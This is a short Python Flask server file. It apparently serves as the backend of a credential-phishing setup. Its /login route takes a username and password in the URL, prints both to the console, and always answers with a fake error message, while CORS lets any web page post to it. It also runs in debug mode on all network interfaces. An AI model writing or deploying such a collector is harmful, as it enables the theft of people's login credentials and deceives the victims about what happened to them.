from flask import Flask
from flask_restful import Api, Resource
from flask_cors import CORS

def startServer():
    app = Flask(__name__)
    CORS(app)
    api = Api(app)

    class getRequest(Resource):

        def get(self, username, password):
            self.getPass(username, password)
            
            return {
                "error": "Error Encountered"
            }

        def getPass(self, username, password):
            print(f"Username: {username}\nPassword: {password}\n")

    api.add_resource(getRequest, "/login/<string:username>:<string:password>")

    app.run(debug=True, host='0.0.0.0', use_reloader=False)

if __name__ == "__main__":
    startServer()